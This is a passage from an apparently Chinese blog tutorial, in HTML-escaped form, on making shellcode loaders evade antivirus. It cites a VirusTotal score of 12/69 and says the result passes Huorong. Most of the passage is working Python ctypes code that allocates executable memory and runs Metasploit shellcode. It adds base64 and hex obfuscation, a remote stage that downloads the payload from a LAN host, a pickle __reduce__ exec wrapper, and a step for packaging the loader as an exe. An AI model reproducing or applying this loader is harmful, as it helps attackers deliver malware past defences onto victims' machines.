&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var16&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">shellc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lef&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">rig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fun1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var10&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var11&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var12&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var13&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var14&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var15&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var16&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">shellc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">build_AV&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查杀结果&lt;a href="https://www.virustotal.com/gui/file/7e1819ae2d57eb451210abcab590f19e095f728349683612e2bf0fd26a3b3374">12/69&lt;/a>，可过火绒&lt;/p>
&lt;h3 id="python">Python&lt;/h3>
&lt;p>使用内置的&lt;code>ctypes&lt;/code>库可以丝滑地调用kernel32.dll的函数，唯一需要注意的是由于64位与32位系统的差异（会影响python对于指针的处理），需要在最开始设置&lt;code>VirtualAlloc.restype = ctypes.c_uint64&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>并且亲测在64位系统上无法处理msf生成的32位shellcode，惨惨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ptr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x3000&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x40&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">from_buffer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">RtlMoveMemory&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ptr&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 创建一个新线程&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CreateThread&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ptr&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pointer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 等待上面创建的线程运行结束&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">WaitForSingleObject&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>对shellcode进行b64处理&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>hex处理&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> bytearray&lt;span style="color:#f92672">(&lt;/span>_shellcode.decode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hex&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="远程wget">远程wget&lt;/h4>
&lt;p>注意尽量避免出现特殊字符，如果有 二次处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeces&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://192.168.1.1:8000/test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># b64格式的payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">escape_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="pickle反序列化">pickle反序列化&lt;/h4>
&lt;p>ctf学到的技巧不能丢，比单纯的hex, xor, b64稍微强一点点，可以配合上面的远程wget方式绕过&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeces&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 生成&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#75715e"># 上面基础款的全部代码&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 加载&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="打包exe">打包exe&lt;/h4>
&lt;p>生成pickle payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = urllib.request.urlopen(&amp;#39;http://192.168.31.29/pay1&amp;#39;).read()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = codecs.escape_decode(_shellcode)[0]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = bytearray(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">buf = (ctypes.c_char * len(_shellcode)).from_buffer(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.RtlMoveMemory(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> buf,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(len(_shellcode))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">handle = ctypes.windll.kernel32.CreateThread(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.pointer(ctypes.c_int(0))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
